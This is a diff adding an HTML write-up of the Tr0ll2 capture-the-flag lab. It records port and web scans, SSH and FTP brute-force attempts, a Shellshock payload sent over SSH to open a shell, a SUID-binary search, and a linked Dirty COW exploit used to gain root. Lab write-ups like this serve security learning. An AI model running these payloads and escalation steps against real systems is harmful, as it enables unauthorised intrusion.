@@ -1,0 +1,117 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>tr0ll2</title>
+</head><body>Attacker IP: 10.0.0.22<br/>
+Target IP: 10.0.0.149<br/>
+<br/>
+Host is up (0.0028s latency).<br/>
+Not shown: 65532 closed ports<br/>
+PORT  STATE SERVICE VERSION<br/>
+21/tcp open ftp   vsftpd 2.0.8 or later<br/>
+22/tcp open ssh   OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+|  1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)<br/>
+|  2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)<br/>
+|_ 256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)<br/>
+80/tcp open http  Apache httpd 2.2.22 ((Ubuntu))<br/>
+|_http-server-header: Apache/2.2.22 (Ubuntu)<br/>
+|_http-title: Site doesn't have a title (text/html).<br/>
+MAC Address: 00:0C:29:22:9F:59 (VMware)<br/>
+Device type: general purpose<br/>
+Running: Linux 2.6.X|3.X<br/>
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3<br/>
+OS details: Linux 2.6.32 - 3.10<br/>
+Network Distance: 1 hop<br/>
+Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+As expected...<br/>
+<img src="image.png"/><br/>
+<br/>
+Dirb<br/>
+---- Scanning URL: http://10.0.0.149/ ----<br/>
++ http://10.0.0.149/cgi-bin/ (CODE:403|SIZE:286)                <br/>
++ http://10.0.0.149/index (CODE:200|SIZE:110)                 <br/>
++ http://10.0.0.149/index.html (CODE:200|SIZE:110)               <br/>
++ http://10.0.0.149/robots (CODE:200|SIZE:346)                 <br/>
++ http://10.0.0.149/robots.txt (CODE:200|SIZE:346)               <br/>
++ http://10.0.0.149/server-status (CODE:403|SIZE:291)  <br/>
+<br/>
+Nikto:<br/>
++ Server: Apache/2.2.22 (Ubuntu)<br/>
++ Server leaks inodes via ETags, header found with file /, inode: 13079, size: 110, mtime: Tue Oct 14 22:05:15 2014<br/>
++ The anti-clickjacking X-Frame-Options header is not present.<br/>
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br/>
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br/>
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br/>
++ Uncommon header 'tcn' found, with contents: list<br/>
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html<br/>
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST <br/>
++ OSVDB-3233: /icons/README: Apache default file found.<br/>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+dirb:<br/>
+---- Scanning URL: http://10.0.0.149/ ----<br/>
+==&gt; DIRECTORY: http://10.0.0.149/noob/                                            <br/>
+==&gt; DIRECTORY: http://10.0.0.149/keep_trying/                                        <br/>
+==&gt; DIRECTORY: http://10.0.0.149/dont_bother/                                        <br/>
+==&gt; DIRECTORY: http://10.0.0.149/ok_this_is_it/                                       <br/>
+                                                              <br/>
+---- Entering directory: http://10.0.0.149/noob/ ----<br/>
+                                                              <br/>
+---- Entering directory: http://10.0.0.149/keep_trying/ ----<br/>
+                                                              <br/>
+---- Entering directory: http://10.0.0.149/dont_bother/ ----<br/>
+                                                              <br/>
+---- Entering directory: http://10.0.0.149/ok_this_is_it/ ----<br/>
+<br/>
+I ran dirb on all the URL's which were returned from robots file and got nothing.<br/>
+<br/>
+I looked at a walkthrough for a hint. I have to examine the images from 4 of the folders that I can access.<br/>
+<br/>
+I downloaded the images and ran strings on them. One of them had this: Look Deep within y0ur_self for the answer<br/>
+<br/>
+<img src="image 3.png"/><br/>
+<br/>
+The file contained bunch of base64 data. I used sort and uniq to make a new clean file since some data was repeated. I decoded the base64 data as well.<br/>
+<br/>
+I thought just like last time, maybe answer.txt is the password and contents, decoded to ascii, are usernames so I tried brute forcing ssh. It didn't help. <br/>
+I started brute forcing SSH again but this time with base64 data. I also started brute forcing ftp with decoded data. None of that worked.<br/>
+<br/>
+Another hint was needed. I needed to log into the ftp server with Tr0ll as the username and password.<br/>
+<br/>
+<img src="image 4.png"/><br/>
+<br/>
+<img src="image 5.png"/><br/>
+<br/>
+<img src="image 6.png"/><br/>
+<br/>
+I guess the answer.txt file was for this.<br/>
+<br/>
+<img src="image 7.png"/><br/>
+<br/>
+<img src="image 8.png"/><br/>
+<br/>
+I assumed that noob maybe a username so I tried this:<br/>
+<img src="image 9.png"/><br/>
+<br/>
+I tried scp too and it didn't work.<br/>
+<br/>
+I looked at a walkthrough again for help. Turns out you can use shellshock and get a shell like this:<br/>
+ssh -i noob noob@10.0.0.149 '() { :;}; /bin/bash'<br/>
+<br/>
+I ran this: find / -user root -perm -4000<div style="text-align: left"><span style="font-size: 12pt"><span style="font-family: Consolas"/></span></div>-print<div style="text-align: left"><span style="font-size: 12pt"><span style="font-family: Consolas"/></span></div>2&gt;/dev/null <br/>
+<br/>
+<img src="image 10.png"/><br/>
+<br/>
+I ran one of the binaries and I could no longer use ls...Pretty sure I broke everything because I ran all 3 of the binaries.<br/>
+This is one way to get file names<br/>
+<img src="image 11.png"/><br/>
+<br/>
+I used this exploit https://www.exploit-db.com/exploits/40839/ and got root, kinda. passwd was messed up and firefart was set to id 0.<br/>
+<br/>
+<img src="image 12.png"/><br/>
+<br/>
+There are other ways to root the box. One of the files under door directory was vulnerable to buffer overflow.<br/>
+</body></html>
